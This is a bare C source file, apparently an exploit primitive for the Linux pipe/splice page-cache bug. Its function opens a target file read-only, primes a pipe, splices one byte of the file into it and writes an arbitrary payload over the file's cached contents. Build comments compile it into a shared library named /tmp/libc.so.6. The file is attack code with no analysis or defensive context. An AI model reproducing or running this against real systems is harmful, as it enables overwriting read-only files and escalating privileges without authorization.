//tcc -c -Wall -Werror -fPIC dirty.c
//tcc -shared -o /tmp/libc.so.6 dirty.o

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 65536
#endif

void dirty(char * filename, char * payload, int length)
{
	const int fd = open(filename, 0);
	int p[2];
	pipe(p);
	fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[PAGE_SIZE];
	write(p[1], buffer, PAGE_SIZE);
	read(p[0], buffer, PAGE_SIZE);
	splice(fd, 0, p[1], NULL, 1, 0);
	write(p[1], payload, length);
}
